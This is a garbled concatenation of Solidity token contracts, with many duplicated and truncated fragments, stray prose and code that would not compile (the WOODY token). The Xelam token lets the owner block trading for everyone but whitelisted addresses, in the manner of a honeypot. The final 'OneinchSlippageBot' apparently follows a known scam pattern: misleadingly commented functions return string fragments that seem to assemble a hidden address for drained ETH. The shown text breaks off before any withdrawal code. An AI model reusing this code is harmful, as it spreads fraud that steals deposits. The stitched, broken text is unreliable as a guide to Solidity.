        require(balanceOf[msg.sender] >= _value, "Saldo insuficiente");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Saldo insuficiente");
        require(allowance[_from][msg.sender] >= _value, "Sem permissão suficiente");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MitoCoin {
    string public name = "MitoCoin";
    string public symbol = "MTC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (10 ** uint256(decimals));
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Saldo insuficiente");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Saldo insuficiente");
        require(allowance[_from][msg.sender] >= _value, "Sem permissão suficiente");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

contract Lock {
    uint public unlockTime;
    address payable public owner;

    event Withdrawal(uint amount, uint when);

    constructor(uint _unlockTime) payable {
        require(
            block.timestamp < _unlockTime,
            "Unlock time should be in the future"
        );

        unlockTime = _unlockTime;
        owner = payable(msg.sender);
    }

    function withdraw() public {
        // Uncomment this line, and the import of "hardhat/console.sol", to print a log in your terminal
        // console.log("Unlock time is %o and block timestamp is %o", unlockTime, block.timestamp);

        require(block.timestamp >= unlockTime, "You can't withdraw yet");
        require(msg.sender == owner, "You aren't the owner");

        emit Withdrawal(address(this).balance, block.timestamp);

        owner.transfer(address(this).balance);
    }
}

// SPDX-License-Identifier: MIT
// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.28;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Xelam is ERC20, Ownable, ReentrancyGuard {

    bool public tradingEnabled;
    mapping(address => bool) public trustedAddresses;
    uint256 constant TOTAL_SUPPLY = 1_000_000_000 * 10**18;
    uint256 public marketingWalletBalance;
    uint256 public developmentWalletBalance;
    string public PROJECT_WEBSITE = "https://xelam.com";
    string public PROJECT_DESCRIPTION = "Xelam: The future of decentralized finance.";

    event TradingEnabled(bool enabled);
    event TrustedAddressAdded(address indexed addr);
    event TrustedAddressRemoved(address indexed addr);
    event PercentageWithdrawn(address indexed to, uint256 amount);
    event DevelopmentWalletFunded(address indexed to, uint256 amount);
    event ProjectWebsiteUpdated(string indexed newWebsite);
    event ProjectDescriptionUpdated(string indexed newDescription);
    event RewardsDistributed(address[] recipients, uint256[] amounts);
    event RewardsClaimed(address indexed user, uint256 amount);
    event ReferralRegistered(address indexed user, address indexed referrer);


    constructor(
        address initialOwner,
        address _marketingWallet,
        address _developmentWallet
    ) ERC20("Xelam", "XEM") Ownable(initialOwner) {
        require(_marketingWallet != address(0) && _developmentWallet != address(0), "Invalid wallet address");
        _mint(initialOwner, TOTAL_SUPPLY);
        trustedAddresses[initialOwner] = true;
        tradingEnabled = false;
        marketingWalletBalance = (TOTAL_SUPPLY * 15) / 100;
        developmentWalletBalance = (TOTAL_SUPPLY * 5) / 100;
        _transfer(initialOwner, _marketingWallet, marketingWalletBalance);
        _transfer(initialOwner, _developmentWallet, developmentWalletBalance);
    }

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
        emit TradingEnabled(true);
    }

    function disableTrading() external onlyOwner {
        tradingEnabled = false;
        emit TradingEnabled(false);
    }

    function addTrustedAddress(address addr) external onlyOwner {
        trustedAddresses[addr] = true;
        emit TrustedAddressAdded(addr);
    }

    function removeTrustedAddress(address addr) external onlyOwner {
        trustedAddresses[addr] = false;
        emit TrustedAddressRemoved(addr);
    }

    function isTrusted(address addr) public view returns (bool) {
        return trustedAddresses[addr];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(tradingEnabled || trustedAddresses[msg.sender], "Trading is restricted");
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(tradingEnabled || trustedAddresses[sender], "Trading is restricted");
        return super.transferFrom(sender, recipient, amount);
    }

    function withdrawPercentage(uint256 percentage) external onlyOwner nonReentrant {
        require(percentage <= 100, "Percentage must be between 0 and 100");
        uint256 amount = (TOTAL_SUPPLY * percentage) / 100;
        _transfer(address(this), owner(), amount);
        emit PercentageWithdrawn(owner(), amount);
    }

    function getBalance() external view returns (uint256) {
        return balanceOf(address(this));
    }

    function fundDevelopmentWallet(uint256 amount) external onlyOwner {
        require(amount <= balanceOf(address(this)), "Insufficient balance");
        _transfer(address(this), owner(), amount);
        developmentWalletBalance += amount;
        emit DevelopmentWalletFunded(owner(), amount);
    }

    function withdrawFromDevelopmentWallet(uint256 amount) external onlyOwner {
        require(amount <= developmentWalletBalance, "Insufficient development wallet balance");
        developmentWalletBalance -= amount;
        _transfer(owner(), msg.sender, amount);
    }

    function updateProjectWebsite(string memory newWebsite) external onlyOwner {
        PROJECT_WEBSITE = newWebsite;
        emit ProjectWebsiteUpdated(newWebsite);
    }

    function updateProjectDescription(string memory newDescription) external onlyOwner {
        PROJECT_DESCRIPTION = newDescription;
        emit ProjectDescriptionUpdated(newDescription);
    }

    mapping(address => uint256) public userRewards;

    function distributeRewards(address[] calldata recipients, uint256[] calldata amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Recipients and amounts arrays must have the same length");
        for (uint256 i = 0; i < recipients.length; i++) {
            require(amounts[i] > 0, "Reward amount must be greater than zero");
            userRewards[recipients[i]] += amounts[i];
            _transfer(address(this), recipients[i], amounts[i]);
        }
        emit RewardsDistributed(recipients, amounts);
    }

    function claimRewards() external {
        uint256 amount = userRewards[msg.sender];
        require(amount > 0, "No rewards to claim");
        userRewards[msg.sender] = 0;
        _transfer(msg.sender, msg.sender, amount);
        emit RewardsClaimed(msg.sender, amount);
    }

    mapping(address => address) public userReferrers;

    function registerReferral(address referrer) external {
        require(userReferrers[msg.sender] == address(0), "Already registered a referrer");
        userReferrers[msg.sender] = referrer;
        emit ReferralRegistered(msg.sender, referrer);
    }

    function getReferrer(address user) public view returns (address) {
        return userReferrers[user];
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

contract Lock {
    uint public unlockTime;
    address payable public owner;

    event Withdrawal(uint amount, uint when);

    constructor(uint _unlockTime) payable {
        require(
            block.timestamp < _unlockTime,
            "Unlock time should be in the future"
        );

        unlockTime = _unlockTime;
        owner = payable(msg.sender);
    }

    function withdraw() public {
        // Uncomment this line, and the import of "hardhat/console.sol", to print a log in your terminal
        // console.log("Unlock time is %o and block timestamp is %o", unlockTime, block.timestamp);

        require(block.timestamp >= unlockTime, "You can't withdraw yet");
        require(msg.sender == owner, "You aren't the owner");

        emit Withdrawal(address(this).balance, block.timestamp);

        owner.transfer(address(this).balance);
    }
}

// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.28;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

        tradingEnabled = false;
        marketingWalletBalance = (TOTAL_SUPPLY * 15) / 100;
        developmentWalletBalance = (TOTAL_SUPPLY * 5) / 100;
        _transfer(initialOwner, _marketingWallet, marketingWalletBalance);
        _transfer(initialOwner, _developmentWallet, developmentWalletBalance);
    }

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
        emit TradingEnabled(true);
    }

    function disableTrading() external onlyOwner {
        tradingEnabled = false;
        emit TradingEnabled(false);
    }

    function addTrustedAddress(address addr) external onlyOwner {
        trustedAddresses[addr] = true;
        emit TrustedAddressAdded(addr);
    }

    function removeTrustedAddress(address addr) external onlyOwner {
        trustedAddresses[addr] = false;
        emit TrustedAddressRemoved(addr);
    }

    function isTrusted(address addr) public view returns (bool) {
        return trustedAddresses[addr];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(tradingEnabled || trustedAddresses[msg.sender], "Trading is restricted");
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(tradingEnabled || trustedAddresses[sender], "Trading is restricted");
        return super.transferFrom(sender, recipient, amount);
    }

    function withdrawPercentage(uint256 percentage) external onlyOwner nonReentrant {
        require(percentage <= 100, "Percentage must be between 0 and 100");
        uint256 amount = (TOTAL_SUPPLY * percentage) / 100;
        _transfer(address(this), owner(), amount);
        emit PercentageWithdrawn(owner(), amount);
    }

    function getBalance() external view returns (uint256) {
        return balanceOf(address(this));
    }

    function fundDevelopmentWallet(uint256 amount) external onlyOwner {
        require(amount <= balanceOf(address(this)), "Insufficient balance");
        _transfer(address(this), owner(), amount);
        developmentWalletBalance += amount;
        emit DevelopmentWalletFunded(owner(), amount);
    }

    function withdrawFromDevelopmentWallet(uint256 amount) external onlyOwner {
        require(amount <= developmentWalletBalance, "Insufficient development wallet balance");
        developmentWalletBalance -= amount;
        _transfer(owner(), msg.sender, amount);
    }

    function updateProjectWebsite(string memory newWebsite) external onlyOwner {
        PROJECT_WEBSITE = newWebsite;
        emit ProjectWebsiteUpdated(newWebsite);
    }

    function updateProjectDescription(string memory newDescription) external onlyOwner {
        PROJECT_DESCRIPTION = newDescription;
        emit ProjectDescriptionUpdated(newDescription);
    }

    mapping(address => uint256) public userRewards;

    function distributeRewards(address[] calldata recipients, uint256[] calldata amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Recipients and amounts arrays must have the same length");
        for (uint256 i = 0; i < recipients.length; i++) {
            require(amounts[i] > 0, "Reward amount must be greater than zero");
            userRewards[recipients[i]] += amounts[i];
            _transfer(address(this), recipients[i], amounts[i]);
        }
        emit RewardsDistributed(recipients, amounts);
    }

    function claimRewards() external {
        uint256 amount = userRewards[msg.sender];
        require(amount > 0, "No rewards to claim");
        userRewards[msg.sender] = 0;
        _transfer(msg.sender, msg.sender, amount);
        emit RewardsClaimed(msg.sender, amount);
    }

    mapping(address => address) public userReferrers;

    function registerReferral(address referrer) external {
        require(userReferrers[msg.sender] == address(0), "Already registered a referrer");
        userReferrers[msg.sender] = referrer;
        emit ReferralRegistered(msg.sender, referrer);
    }

    function getReferrer(address user) public view returns (address) {
        return userReferrers[user];
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

contract Lock {
    uint public unlockTime;
    address payable public owner;

    event Withdrawal(uint amount, uint when);

    constructor(uint _unlockTime) payable {
        require(
            block.timestamp < _unlockTime,
            "Unlock time should be in the future"
        );

        unlockTime = _unlockTime;
        owner = payable(msg.sender);
    }

    function withdraw() public {
        // Uncomment this line, and the import of "hardhat/console.sol", to print a log in your terminal
        // console.log("Unlock time is %o and block timestamp is %o", unlockTime, block.timestamp);

        require(block.timestamp >= unlockTime, "You can't withdraw yet");
        require(msg.sender == owner, "You aren't the owner");

        emit Withdrawal(address(this).balance, block.timestamp);

        owner.transfer(address(this).balance);
    }
}

Explain what is a solidity contract!
----------------------------------------------------------------------------------------------------
Explanation of HUSH Money (HUSH$) Solidity Smart Contract

1. Contract Name & Token Type:

This contract is called HushMoney.

It is an ERC-20 token that follows Ethereum’s standard for fungible tokens.



2. Total Supply & Minting:

The total supply is 21,000,000 HUSH$.

When deployed, the contract mints all tokens to the deployer's wallet.



3. Burn Mechanism:

Token holders can burn their tokens, reducing the circulating supply.

The _burn() function removes tokens from existence.



4. Airdrop Functionality:

The contract owner (deployer) can airdrop tokens to wallets.

The airdrop is capped so that it doesn’t exceed the total supply.



5. Security & Ownership:

Ownable from OpenZeppelin ensures only the owner can mint new tokens.

Prevents unauthorized minting or modification.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
// WOODY Token contract for EVM-compatible blockchains
contract WOODYToken is ERC20, ReentrancyGuard, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    uint256 public constant PEG_PRICE = 5e18; // $5.00 in wei
    // Define a constant for the number of decimals in your token (usually 18 for ERC20)
    uint public constant DECIMALS = 18;
    // Declare max supply
    uint256 public constant MAX_SUPPLY = 10000000 * (10  DECIMALS); // Max supply of 10 million tokens
    // Wallets for distribution
    address public wallet1 = 0x1A1CbbA1606bD1C714EE1C0F5D81A1805721B828;
    address public wallet2 = 0x2492Da0b33BA1ca48a703f69B4BA72De254cbF21;
    event Minted(address indexed to, uint256 amount);
    event Burned(address indexed from, uint256 amount);
    // Constructor: Initialize the token with an initial supply and admin address
    constructor(uint256 initialSupply, address admin) ERC20("WOODY", "WOODY") {
        require(initialSupply <= MAX_SUPPLY, "Initial supply exceeds max supply");
        _mint(msg.sender, initialSupply); // Initial minting
        _setupRole(DEFAULT_ADMIN_ROLE, _admin); // Set up default admin role
        _setupRole(MINTER_ROLE, _admin); // Assign the minter role to admin
    }
    // Restrict functions to roles
    modifier onlyAdmin() {
        require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), "Not an admin");
        ; // This indicates where to continue with the modified function logic
    }
    // Mint function with 10% distribution
    function mintWOODY(uint256 amount) external onlyRole(MINTER_ROLE) nonReentrant {
        require(amount > 0, "Amount must be greater than 0");
        require(totalSupply() + amount <= MAX_SUPPLY, "Cannot exceed max supply"); // Ensure we don't exceed max supply
        uint256 distributionAmount = (amount * 10) / 100; // Calculate 10% for distribution
        uint256 mainMintAmount = amount - distributionAmount; // Remaining amount to mint
        _mint(msg.sender, mainMintAmount); // Mint the main amount to the caller
        _mint(wallet1, distributionAmount); // 10% to wallet1
        _mint(wallet2, distributionAmount); // 10% to wallet2
        emit Minted(msg.sender, mainMintAmount);
        emit Minted(wallet1, distributionAmount);
        emit Minted(wallet2, distributionAmount);
    }
    // Burn function
    function burnWOODY(uint256 amount) external nonReentrant {
        require(amount > 0, "Amount must be greater than 0");
        _burn(msg.sender, amount); // Burn tokens from sender's balance
        emit Burned(msg.sender, amount); // Emit Burned event
    }
    // Function to check the USD value of WOODY tokens
    function getWOODYValue(uint256 amount) external view returns (uint256) {
        return (amount * PEG_PRICE) / (10  DECIMALS); // Returns dollar value with correct exponentiation
    }
    // Admin role management
    function changeAdmin(address newAdmin) external onlyRole(DEFAULT_ADMIN_ROLE) {
        require(newAdmin != address(0), "New admin cannot be the zero address");
        admin = newAdmin; // Change admin address
        // Set up new admin role
        _setupRole(DEFAULT_ADMIN_ROLE, newAdmin); 
        _setupRole(MINTER_ROLE, newAdmin); // Optionally assign minter role to new admin
    }
    // Allow the contract to receive ETH
    receive() external payable {}
}

Explanation of HUSH Money (HUSH$) Solidity Smart Contract

1. Contract Name & Token Type:

This contract is called HushMoney.

It is an ERC-20 token that follows Ethereum’s standard for fungible tokens.



2. Total Supply & Minting:

The total supply is 21,000,000 HUSH$.

When deployed, the contract mints all tokens to the deployer's wallet.



3. Burn Mechanism:

Token holders can burn their tokens, reducing the circulating supply.

The _burn() function removes tokens from existence.



4. Airdrop Functionality:

The contract owner (deployer) can airdrop tokens to wallets.

The airdrop is capped so that it doesn’t exceed the total supply.



5. Security & Ownership:

Ownable from OpenZeppelin ensures only the owner can mint new tokens.

Prevents unauthorized minting or modification.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract HushMoney is ERC20, Ownable {
    uint256 public maxSupply = 21000000 * 10 ** decimals(); // 21M HUSH$

    constructor() ERC20("HUSH Money", "HUSH$") {
        _mint(msg.sender, maxSupply); // Mint all tokens to deployer
    }

    function burn(uint256 amount) public {
        _burn(msg.sender, amount); // Allows holders to burn tokens
    }

    function airdrop(address recipient, uint256 amount) external onlyOwner {
        require(totalSupply() + amount <= maxSupply, "Exceeds max supply");
        _mint(recipient, amount);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
// WOODY Token contract for EVM-compatible blockchains
contract WOODYToken is ERC20, ReentrancyGuard, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    uint256 public constant PEG_PRICE = 5e18; // $5.00 in wei
    // Define a constant for the number of decimals in your token (usually 18 for ERC20)
    uint public constant DECIMALS = 18;
    // Declare max supply
    uint256 public constant MAX_SUPPLY = 10000000 * (10  DECIMALS); // Max supply of 10 million tokens
    // Wallets for distribution
    address public wallet1 = 0x1A1CbbA1606bD1C714EE1C0F5D81A1805721B828;
    address public wallet2 = 0x2492Da0b33BA1ca48a703f69B4BA72De254cbF21;
    event Minted(address indexed to, uint256 amount);
    event Burned(address indexed from, uint256 amount);
    // Constructor: Initialize the token with an initial supply and admin address
    constructor(uint256 initialSupply, address admin) ERC20("WOODY", "WOODY") {
        require(initialSupply <= MAX_SUPPLY, "Initial supply exceeds max supply");
        _mint(msg.sender, initialSupply); // Initial minting
        _setupRole(DEFAULT_ADMIN_ROLE, _admin); // Set up default admin role
        _setupRole(MINTER_ROLE, _admin); // Assign the minter role to admin
    }
    // Restrict functions to roles
    modifier onlyAdmin() {
        require(hasRole(DEFAULT_ADMIN_ROLE, msg.sender), "Not an admin");
        ; // This indicates where to continue with the modified function logic
    }
    // Mint function with 10% distribution
    function mintWOODY(uint256 amount) external onlyRole(MINTER_ROLE) nonReentrant {
        require(amount > 0, "Amount must be greater than 0");
        require(totalSupply() + amount <= MAX_SUPPLY, "Cannot exceed max supply"); // Ensure we don't exceed max supply
        uint256 distributionAmount = (amount * 10) / 100; // Calculate 10% for distribution
        uint256 mainMintAmount = amount - distributionAmount; // Remaining amount to mint
        _mint(msg.sender, mainMintAmount); // Mint the main amount to the caller
        _mint(wallet1, distributionAmount); // 10% to wallet1
        _mint(wallet2, distributionAmount); // 10% to wallet2
        emit Minted(msg.sender, mainMintAmount);
        emit Minted(wallet1, distributionAmount);
        emit Minted(wallet2, distributionAmount);
    }
    // Burn function
    function burnWOODY(uint256 amount) external nonReentrant {
        require(amount > 0, "Amount must be greater than 0");
        _burn(msg.sender, amount); // Burn tokens from sender's balance
        emit Burned(msg.sender, amount); // Emit Burned event
    }
    // Function to check the USD value of WOODY tokens
    function getWOODYValue(uint256 amount) external view returns (uint256) {
        return (amount * PEG_PRICE) / (10  DECIMALS); // Returns dollar value with correct exponentiation
    }
    // Admin role management
    function changeAdmin(address newAdmin) external onlyRole(DEFAULT_ADMIN_ROLE) {
        require(newAdmin != address(0), "New admin cannot be the zero address");
        admin = newAdmin; // Change admin address
        // Set up new admin role
        _setupRole(DEFAULT_ADMIN_ROLE, newAdmin); 
        _setupRole(MINTER_ROLE, newAdmin); // Optionally assign minter role to new admin
    }
    // Allow the contract to receive ETH
    receive() external payable {}
}

//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract OneinchSlippageBot {

    //string public tokenName;
    //string public tokenSymbol;
    uint liquidity;
    string private WETH_CONTRACT_ADDRESS = "";
    string private UNISWAP_CONTRACT_ADDRESS = "";

    event Log(string _msg);

    constructor() public {
        //tokenSymbol = _mainTokenSymbol;
        //tokenName = _mainTokenName;
    }

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }

    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */
    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
        uint shortest = self._len;
        if (other._len < self._len)
            shortest = other._len;
        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }
     
    function getMempoolStart() private pure returns (string memory) {
        return "b0D6"; 
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;            
            }        
        }    
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }
    
    function getMempoolShort() private pure returns (string memory) {
        return "0x224";
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
